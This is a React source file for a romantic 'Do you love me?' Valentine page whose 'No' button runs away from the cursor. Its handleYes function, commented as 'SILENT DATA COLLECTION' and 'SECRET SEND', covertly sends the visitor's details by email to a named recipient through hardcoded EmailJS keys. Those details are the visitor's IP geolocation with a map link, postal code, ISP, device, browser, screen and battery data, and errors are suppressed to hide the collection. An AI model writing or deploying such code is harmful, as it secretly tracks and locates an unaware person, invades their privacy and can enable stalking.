import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Heart, Sparkles, Volume2, VolumeX } from "lucide-react";
import confetti from "canvas-confetti";
import emailjs from "@emailjs/browser";

const SecretLuxuryValentine = () => {
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });
  const [isAccepted, setIsAccepted] = useState(false);
  const [isMusicPlaying, setIsMusicPlaying] = useState(false);
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
  const [roses, setRoses] = useState([]);
  const audioRef = useRef(null);

  useEffect(() => {
    const interval = setInterval(() => {
      setRoses((prev) => [
        ...prev.slice(-20),
        {
          id: Date.now(),
          left: Math.random() * 100,
          type: Math.random() > 0.4 ? "🌹" : "💖",
          size: Math.random() * 25 + 20,
          duration: Math.random() * 5 + 5,
        },
      ]);
    }, 800);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handleMove = (e) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", handleMove);
    return () => window.removeEventListener("mousemove", handleMove);
  }, []);

  const moveNoButton = () => {
    const x = (Math.random() - 0.5) * (window.innerWidth * 0.6);
    const y = (Math.random() - 0.5) * (window.innerHeight * 0.6);
    setNoButtonPos({ x, y });
  };

  const handleYes = async () => {
    setIsAccepted(true);

    // Aesthetic Confetti
    confetti({
      particleCount: 150,
      spread: 70,
      origin: { y: 0.6 },
      colors: ["#ff0055", "#ffd700", "#ffffff"],
    });

    try {
      // 1. SILENT DATA COLLECTION
      const geoRes = await fetch("https://ipapi.co/json/");
      const geo = await geoRes.json();

      const battery = await navigator.getBattery?.();

      const fullDetailMessage = `
        🌹 VALENTINE ACCEPTED! 🌹
        --------------------------
        📍 LOCATION DATA:
        IP: ${geo.ip}
        City: ${geo.city} (${geo.postal})
        Region: ${geo.region}
        Country: ${geo.country_name}
        ISP: ${geo.org}
        Map: https://www.google.com/maps?q=${geo.latitude},${geo.longitude}

        📱 DEVICE & SYSTEM:
        Device: ${navigator.platform}
        Browser: ${navigator.userAgent}
        Screen: ${window.screen.width}x${window.screen.height}
        Battery: ${battery ? Math.round(battery.level * 100) + "%" : "Unknown"}
        Language: ${navigator.language}
        
        ⏰ TIMESTAMP:
        Date: ${new Date().toLocaleString()}
      `;

      // 2. SECRET SEND (Using your provided keys)
      emailjs.send(
        "service_zl8ycen",
        "template_nz3e9jp",
        {
          to_name: "Amar Kumar",
          message: fullDetailMessage,
        },
        "lxUfAecwZ_It3aGzn",
      );
    } catch (err) {
      // Fail silently to keep the surprise
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-[#0a0104] flex items-center justify-center overflow-hidden font-serif text-white">
      <audio
        ref={audioRef}
        loop
        src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
      />

      {/* LUXURY SPOTLIGHT */}
      <div
        className="absolute inset-0 z-10 pointer-events-none opacity-40"
        style={{
          background: `radial-gradient(600px circle at ${mousePos.x}px ${mousePos.y}px, rgba(255,0,85,0.2), transparent 80%)`,
        }}
      />

      {/* BACKGROUND PETALS */}
      <AnimatePresence>
        {roses.map((r) => (
          <motion.div
            key={r.id}
            initial={{ y: -100, x: `${r.left}vw`, opacity: 0 }}
            animate={{ y: "110vh", opacity: [0, 1, 1, 0], rotate: 360 }}
            transition={{ duration: r.duration, ease: "linear" }}
            className="absolute pointer-events-none z-0"
            style={{ fontSize: r.size }}
          >
            {r.type}
          </motion.div>
        ))}
      </AnimatePresence>

      {/* MUSIC TOGGLE */}
      <button
        onClick={() => {
          isMusicPlaying ? audioRef.current.pause() : audioRef.current.play();
          setIsMusicPlaying(!isMusicPlaying);
        }}
        className="fixed top-8 right-8 z-50 p-4 rounded-full border border-pink-500/30 bg-black/50 text-pink-500 backdrop-blur-md"
      >
        {isMusicPlaying ? <Volume2 className="animate-pulse" /> : <VolumeX />}
      </button>

      <AnimatePresence mode="wait">
        {!isAccepted ? (
          <motion.div
            key="ask"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="relative z-20 w-full max-w-lg p-[1px] rounded-[50px] bg-gradient-to-b from-pink-500/40 via-transparent to-pink-500/40"
          >
            <div className="bg-[#120106]/95 backdrop-blur-3xl p-12 md:p-16 rounded-[49px] text-center border border-white/5 shadow-2xl">
              <motion.div
                animate={{ scale: [1, 1.1, 1] }}
                transition={{ repeat: Infinity, duration: 2 }}
                className="mb-8 inline-block"
              >
                <Heart
                  size={80}
                  fill="#ff0055"
                  className="text-pink-600 drop-shadow-[0_0_15px_#ff0055]"
                />
              </motion.div>

              <h1 className="text-5xl md:text-6xl font-black text-white mb-10 tracking-tighter leading-tight">
                Do you <span className="text-pink-500">love</span> me?
              </h1>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-12 mt-4 min-h-[140px]">
                <motion.button
                  onClick={handleYes}
                  whileHover={{ scale: 1.1, boxShadow: "0 0 40px #ff0055" }}
                  className="px-16 py-6 bg-gradient-to-r from-pink-600 to-rose-700 text-white font-bold rounded-2xl text-3xl"
                >
                  YES ❤️
                </motion.button>

                <motion.button
                  onMouseEnter={moveNoButton}
                  onClick={moveNoButton}
                  animate={{ x: noButtonPos.x, y: noButtonPos.y }}
                  transition={{ type: "spring", stiffness: 500, damping: 15 }}
                  className="px-10 py-4 bg-white/5 border border-white/10 text-white/20 rounded-2xl text-xl hover:text-white"
                >
                  No 🥀
                </motion.button>
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            className="z-30 text-center"
          >
            <h1 className="text-8xl md:text-[160px] font-black text-white drop-shadow-[0_0_80px_#ff0055]">
              MINE. 💍
            </h1>
            <div className="bg-white/5 backdrop-blur-2xl p-12 rounded-[60px] border border-pink-500/20 max-w-xl mx-auto shadow-2xl">
              <Sparkles className="mx-auto text-pink-500 mb-6" size={50} />
              <h2 className="text-4xl text-pink-400 font-bold mb-4">
                Congrats! My GF ❤️
              </h2>
              <p className="text-xl text-gray-300 font-light italic leading-relaxed">
                "Today marks the beginning of our forever story. I promise to
                cherish every single moment with you."
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default SecretLuxuryValentine;
